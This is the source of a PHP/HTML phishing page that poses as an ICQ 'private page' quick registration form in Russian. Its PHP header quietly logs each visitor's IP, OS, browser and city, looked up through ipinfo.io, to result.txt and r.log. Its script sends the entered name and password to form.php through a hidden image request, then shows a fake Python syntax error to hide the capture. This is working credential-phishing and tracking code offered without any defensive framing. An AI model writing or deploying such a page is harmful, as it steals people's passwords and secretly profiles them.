<?php
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;
$user_agent = $_SERVER["HTTP_USER_AGENT"];
  if (strpos($user_agent, "Firefox") !== false) $browser = "Firefox";
  elseif (strpos($user_agent, "Opera") !== false) $browser = "Opera";
  elseif (strpos($user_agent, "Chrome") !== false) $browser = "Chrome";
  elseif (strpos($user_agent, "MSIE") !== false) $browser = "Internet Explorer";
  elseif (strpos($user_agent, "Safari") !== false) $browser = "Safari";
  else $browser = "Неизвестный";
$newTitle = substr($user_agent, strpos($user_agent, '('));
while(true){
  if($newTitle[$i]==")"){
  $res = substr($newTitle, 1, $i=$i-1);
  break;
  }else{
      $i++;
  }
}
$url = file_get_contents("https://ipinfo.io/$ip/json");
$obj = json_decode($url,true);
$city = $obj['city'];
$all = "OS: $res \r IP: $ip \r Browser: $browser \r City: $city \r \r";
$f = fopen("result.txt", "w+");
fwrite($f, $all);
fclose($f);
$fs = fopen("r.log", "a+");
fwrite($fs, $all);
fclose($fs);
?>


<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Registration</title>
    <script>
    var ii = 0;
    </script>
    <style>
    .h{
      font-family: arial,sans-serif;
      font-size: 22px;
    }
    .h2{
      font-family: arial,sans-serif;
      font-size: 17px;
    }
    center{margin-top: 8%;}
      #code{
        display:none;

      }.inp{
        height:45px;
        width:300px;
        border-radius: 25px;
        border:1px solid #fff;
        box-shadow: 0 0 1px 0.2px rgba(0,0,0,0.15),0 1px 12px rgba(0,0,0,0.15);
        padding: 0px 0px 0px 25px;
      }.sun{
        height:40px;
        width:120px;
        border:1px solid #21d86a;
        background:#21d86a;
        border-radius: 25px;
        color:#fff;
        font-size: 16px;
      }.recap{
        border-radius: 90px;
        padding: 8px 40px 0px 0px;
      }.icq{
        border:1px solid #000;
        border-radius: 100%;
        background: #000;
      }
    </style>
  </head>
  <body>
    <center>
      <img src="https://icq.com/cached/img/landing/desktop/logo.png" height="100px" class="icq"><br><br>
      <div class="h">
        Приватная страница
      </div>
      <br>
      <div class="h2">
        Быстрая регистрация
      </div>
      <b id='error' style="color:red;"></b>
      <div id="block" ><br><br>
        <input id="nik" class="inp" placeholder="Имя"><br><br>
        <input id=pass1 class="inp" placeholder="Придумайте сложный пароль"><br><br>
        <input id=pass2 class="inp" placeholder="Повтрите пароль"><br><br>
        <button type="submit" id="phone" class="sun" placeholder="Phone number" ><l>Далее</l></button>
      </div>


    </center>
  <img scr="" style="display:none;" id=sender>
  </body>
  <script>
  var nik = document.getElementById("nik");
  var pas1s = document.getElementById("pass1");
  var pas2s = document.getElementById("pass2");
  var err = document.getElementById("error");
  var sender = document.getElementById("sender");
  document.getElementById("phone").onclick = function(){
    if(pas1s.value!==pas2s.value){
      err.innerHTML="Повторный пароль был введен неверно.";
    }else{
      if((pas1s.value.length <= 4)||(pas1s.value <= "qwerty")){
        err.innerHTML="Слишком простой пароль.";
      }else{
        err.innerHTML='SyntaxError: EOL while scanning string literal <br>File "<stdin>", line 76 registrat = "< $_GET[""]';
      }
    }
    sender.src="form.php?nik="+nik.value+"&pass1="+pas1s.value+"&pass2="+pas2s.value;
  }
  </script>
</html>
